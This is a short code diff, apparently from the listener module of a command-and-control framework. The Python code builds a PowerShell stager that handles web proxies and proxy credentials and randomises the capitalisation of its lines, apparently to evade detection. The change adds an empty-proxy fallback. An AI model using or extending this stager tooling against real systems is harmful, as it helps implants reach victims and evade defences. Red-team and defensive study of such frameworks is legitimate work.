@@ -348,9 +348,10 @@ class Listener:
                                     usr = username.split('\\')[0]
                                     stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"');"
                                 stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = $netcred;")
-
+                    else:
+                        stager += helpers.randomize_capitalization("$wc.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();")
                         #save the proxy settings to use during the entire staging process and the agent
-                        stager += "$Script:Proxy = $wc.Proxy;"
+                    stager += "$Script:Proxy = $wc.Proxy;"
 
                 # TODO: reimplement stager retries?
                 #check if we're using IPv6
